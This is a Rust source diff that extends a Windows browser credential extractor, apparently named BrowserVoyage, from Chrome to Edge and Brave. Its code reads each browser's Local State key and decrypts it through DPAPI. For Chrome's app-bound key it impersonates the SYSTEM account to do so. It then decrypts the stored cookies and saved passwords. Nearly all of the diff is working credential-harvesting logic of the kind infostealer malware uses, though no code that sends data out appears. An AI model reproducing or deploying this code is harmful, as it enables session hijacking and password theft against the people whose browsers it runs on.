@@ -40,21 +40,48 @@ struct LocalState {
 
 #[derive(Debug, Deserialize)]
 struct OsCrypt {
-    app_bound_encrypted_key: String,
+    app_bound_encrypted_key: Option<String>,
+    encrypted_key: Option<String>,
 }
 
 #[derive(Debug)]
 pub struct WindowsChromeExtractor {
     user_data_path: PathBuf,
+    browser_name: String,
 }
 
 impl WindowsChromeExtractor {
-    pub fn new() -> Self {
-        let user_profile = env::var("USERPROFILE").unwrap_or_default();
-        let user_data_path =
-            PathBuf::from(&user_profile).join("AppData/Local/Google/Chrome/User Data");
+    pub fn new(browser_name: &str) -> Self {
+        let user_data_path = Self::get_user_data_path(browser_name);
 
-        Self { user_data_path }
+        Self {
+            user_data_path,
+            browser_name: browser_name.to_string(),
+        }
+    }
+
+    pub fn chrome() -> Self {
+        Self::new("Chrome")
+    }
+
+    pub fn edge() -> Self {
+        Self::new("Edge")
+    }
+
+    pub fn brave() -> Self {
+        Self::new("Brave")
+    }
+
+    fn get_user_data_path(browser_name: &str) -> PathBuf {
+        let user_profile = env::var("USERPROFILE").unwrap_or_default();
+        let base_path = PathBuf::from(&user_profile);
+
+        match browser_name {
+            "Chrome" => base_path.join("AppData/Local/Google/Chrome/User Data"),
+            "Edge" => base_path.join("AppData/Local/Microsoft/Edge/User Data"),
+            "Brave" => base_path.join("AppData/Local/BraveSoftware/Brave-Browser/User Data"),
+            _ => base_path.join(format!("AppData/Local/{}/User Data", browser_name)),
+        }
     }
 
     #[instrument(skip(blob_data))]
@@ -338,32 +365,55 @@ impl WindowsChromeExtractor {
             .decrypt(nonce, ciphertext)
             .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("AES-GCM: {e}")))?;
 
-        // For cookies, check if the first 32 bytes match the domain hash
+        // Special handling for cookies: validate the domain hash
         if let Some(host) = host_key {
+            // Calculate SHA-256 hash of the domain
             let mut hasher = Sha256::new();
             hasher.update(host.as_bytes());
             let computed_hash = hasher.finalize();
 
+            // If the first 32 bytes match the domain hash, extract the actual cookie value
             if decrypted.len() >= 32 && computed_hash.as_slice() == &decrypted[..32] {
+                debug!(
+                    "Domain hash verification passed for {}, stripping 32-byte prefix",
+                    host
+                );
                 return Ok(String::from_utf8(decrypted[32..].to_vec())?);
+            } else {
+                debug!("Domain hash verification failed or not present for {}, using full decrypted content", host);
             }
         }
 
-        // For passwords or if no domain hash match, return the full decrypted content
+        // Convert the decrypted binary data to a UTF-8 string (for passwords or cookies without domain hash)
         Ok(String::from_utf8(decrypted)?)
     }
 
     fn extract_master_key(&self) -> BrowserVoyageResult<Vec<u8>> {
         let local_state_path = self.user_data_path.join("Local State");
 
-        info!("Reading Chrome Local State file");
+        info!("Reading {} Local State file", self.browser_name);
         let local_state_content = fs::read_to_string(&local_state_path)
             .map_err(|e| BrowserVoyageError::Io(format!("Failed to read Local State: {e}")))?;
         let local_state: LocalState = serde_json::from_str(&local_state_content)?;
 
-        let app_bound_encrypted_key = local_state.os_crypt.app_bound_encrypted_key;
+        match self.browser_name.as_str() {
+            "Chrome" => self.extract_chrome_master_key(&local_state.os_crypt),
+            "Edge" | "Brave" => self.extract_simple_master_key(&local_state.os_crypt),
+            _ => Err(BrowserVoyageError::ParseError(format!(
+                "Unsupported browser: {}",
+                self.browser_name
+            ))),
+        }
+    }
+
+    fn extract_chrome_master_key(&self, os_crypt: &OsCrypt) -> BrowserVoyageResult<Vec<u8>> {
+        let app_bound_encrypted_key =
+            os_crypt.app_bound_encrypted_key.as_ref().ok_or_else(|| {
+                BrowserVoyageError::ParseError("Missing app_bound_encrypted_key for Chrome".into())
+            })?;
+
         let key_blob_encrypted_with_prefix = BASE64
-            .decode(&app_bound_encrypted_key)
+            .decode(app_bound_encrypted_key)
             .map_err(|_| BrowserVoyageError::Base64Error)?;
 
         if key_blob_encrypted_with_prefix.len() < 4
@@ -388,10 +438,117 @@ impl WindowsChromeExtractor {
         self.derive_v20_master_key(&parsed_data)
     }
 
+    fn extract_simple_master_key(&self, os_crypt: &OsCrypt) -> BrowserVoyageResult<Vec<u8>> {
+        // First try the standard Edge/Brave approach
+        if let Some(encrypted_key) = &os_crypt.encrypted_key {
+            if let Ok(key) = self.try_standard_dpapi_approach(encrypted_key) {
+                return Ok(key);
+            }
+            debug!(
+                "Standard DPAPI approach failed for {}, trying Edge browser approach",
+                self.browser_name
+            );
+        }
+
+        // Fallback: Try Edge browser approach using Chrome's system-user DPAPI method
+        if let Some(app_bound_encrypted_key) = &os_crypt.app_bound_encrypted_key {
+            if let Ok(key) = self.try_edge_browser_approach(app_bound_encrypted_key) {
+                return Ok(key);
+            }
+        }
+
+        Err(BrowserVoyageError::ParseError(format!(
+            "Failed to extract master key for {} using any available method",
+            self.browser_name
+        )))
+    }
+
+    fn try_standard_dpapi_approach(&self, encrypted_key: &str) -> BrowserVoyageResult<Vec<u8>> {
+        let key_with_prefix = BASE64
+            .decode(encrypted_key)
+            .map_err(|_| BrowserVoyageError::Base64Error)?;
+
+        if key_with_prefix.len() < 5 || &key_with_prefix[..5] != b"DPAPI" {
+            return Err(BrowserVoyageError::ParseError(
+                "Invalid encrypted_key prefix".into(),
+            ));
+        }
+
+        let encrypted_key_data = &key_with_prefix[5..];
+
+        info!("Decrypting {} key with user DPAPI only", self.browser_name);
+        let decrypted_content = self.dpapi_unprotect(encrypted_key_data)?;
+
+        // For Edge and Brave, the state key is the last 32 bytes of the DPAPI decrypted content
+        if decrypted_content.len() < 32 {
+            return Err(BrowserVoyageError::ParseError(format!(
+                "DPAPI decrypted content too short for {}: expected at least 32 bytes, got {}",
+                self.browser_name,
+                decrypted_content.len()
+            )));
+        }
+
+        let state_key = decrypted_content[decrypted_content.len() - 32..].to_vec();
+
+        debug!(
+            "Successfully extracted {} master key using standard approach (last 32 bytes of {} total)",
+            self.browser_name,
+            decrypted_content.len()
+        );
+        Ok(state_key)
+    }
+
+    fn try_edge_browser_approach(
+        &self,
+        app_bound_encrypted_key: &str,
+    ) -> BrowserVoyageResult<Vec<u8>> {
+        info!(
+            "Attempting Edge browser approach for {} (system-user DPAPI + last 32 bytes)",
+            self.browser_name
+        );
+
+        let key_blob_encrypted_with_prefix = BASE64
+            .decode(app_bound_encrypted_key)
+            .map_err(|_| BrowserVoyageError::Base64Error)?;
+
+        if key_blob_encrypted_with_prefix.len() < 4
+            || &key_blob_encrypted_with_prefix[..4] != b"APPB"
+        {
+            return Err(BrowserVoyageError::ParseError(
+                "Invalid app_bound_encrypted_key prefix".into(),
+            ));
+        }
+
+        let key_blob_encrypted = &key_blob_encrypted_with_prefix[4..];
+
+        // Try system-user DPAPI approach like Chrome but take last 32 bytes
+        let _guard = ImpersonationGuard::new()?;
+        let key_blob_system_decrypted = self.dpapi_unprotect(key_blob_encrypted)?;
+        drop(_guard);
+
+        let key_blob_user_decrypted = self.dpapi_unprotect(&key_blob_system_decrypted)?;
+
+        // Try Edge browser approach: use the last 32 bytes of decrypted key directly
+        if key_blob_user_decrypted.len() >= 32 {
+            let state_key = key_blob_user_decrypted[key_blob_user_decrypted.len() - 32..].to_vec();
+            debug!(
+                "Successfully extracted {} master key using Edge browser approach (last 32 bytes of {} total)",
+                self.browser_name,
+                key_blob_user_decrypted.len()
+            );
+            Ok(state_key)
+        } else {
+            Err(BrowserVoyageError::ParseError(format!(
+                "System-user DPAPI decrypted content too short for Edge approach: expected at least 32 bytes, got {}",
+                key_blob_user_decrypted.len()
+            )))
+        }
+    }
+
     fn extract_cookies(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Cookie>> {
         let cookie_db_path = self.user_data_path.join("Default/Network/Cookies");
 
-        info!("Connecting to Chrome cookie database");
+        info!("Connecting to {} cookie database", self.browser_name);
         let conn = Connection::open_with_flags(
             &cookie_db_path,
             rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
@@ -411,17 +568,43 @@ impl WindowsChromeExtractor {
         })?;
 
         let mut extracted_cookies = Vec::new();
+        let mut total_cookies = 0;
+        let mut encrypted_cookies = 0;
+        let mut non_prefixed_cookies = 0;
 
         for cookie in cookies {
             let (host_key, name, encrypted_value, path, expiry, is_secure) = cookie?;
+            total_cookies += 1;
+
+            if encrypted_value.is_empty() {
+                debug!(
+                    "Skipping cookie {}/{} - empty encrypted_value",
+                    host_key, name
+                );
+                continue;
+            }
+
+            debug!(
+                "Processing cookie {}/{}: encrypted_value length = {}, first 3 bytes = {:?}",
+                host_key,
+                name,
+                encrypted_value.len(),
+                if encrypted_value.len() >= 3 {
+                    String::from_utf8_lossy(&encrypted_value[..3])
+                } else {
+                    "N/A".into()
+                }
+            );
 
             if encrypted_value.len() > 3
                 && (&encrypted_value[..3] == b"v20"
                     || &encrypted_value[..3] == b"v10"
                     || &encrypted_value[..3] == b"v11")
             {
+                encrypted_cookies += 1;
                 match self.decrypt_chromium_value(&encrypted_value, master_key, Some(&host_key)) {
                     Ok(decrypted_value) => {
+                        debug!("Successfully decrypted cookie {}/{}", host_key, name);
                         extracted_cookies.push(Cookie {
                             host: host_key.clone(),
                             name,
@@ -435,8 +618,17 @@ impl WindowsChromeExtractor {
                         debug!("Failed to decrypt cookie {}/{}: {}", host_key, name, e);
                     }
                 }
+            } else {
+                non_prefixed_cookies += 1;
+                debug!(
+                    "Skipping cookie {}/{} - no recognized encryption prefix",
+                    host_key, name
+                );
             }
         }
+
+        debug!("Cookie processing summary for {}: total={}, encrypted={}, non-prefixed={}, extracted={}", 
+               self.browser_name, total_cookies, encrypted_cookies, non_prefixed_cookies, extracted_cookies.len());
 
         info!("Successfully extracted {} cookies", extracted_cookies.len());
         Ok(extracted_cookies)
@@ -450,10 +642,13 @@ impl WindowsChromeExtractor {
             return Ok(Vec::new());
         }
 
-        info!("Connecting to Chrome Login Data database");
+        info!("Connecting to {} Login Data database", self.browser_name);
 
         // Try to copy the database file if it's locked
-        let temp_path = std::env::temp_dir().join("chrome_login_data_temp.db");
+        let temp_path = std::env::temp_dir().join(format!(
+            "{}_login_data_temp.db",
+            self.browser_name.to_lowercase()
+        ));
         let db_path = if Connection::open_with_flags(
             &login_db_path,
             rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
@@ -523,7 +718,7 @@ impl WindowsChromeExtractor {
 
 impl BrowserExtractor for WindowsChromeExtractor {
     fn name(&self) -> &str {
-        "Chrome"
+        &self.browser_name
     }
 
     fn extract(&mut self) -> BrowserVoyageResult<ExtractedData> {
@@ -540,8 +735,13 @@ impl BrowserExtractor for WindowsChromeExtractor {
 
         Ok(ExtractedData {
             browser: BrowserInfo {
-                name: "Chrome".to_string(),
-                vendor: "Google".to_string(),
+                name: self.browser_name.clone(),
+                vendor: match self.browser_name.as_str() {
+                    "Chrome" => "Google".to_string(),
+                    "Edge" => "Microsoft".to_string(),
+                    "Brave" => "Brave Software".to_string(),
+                    _ => "Unknown".to_string(),
+                },
                 platform: "Windows".to_string(),
             },
             profiles: vec![profile_data],
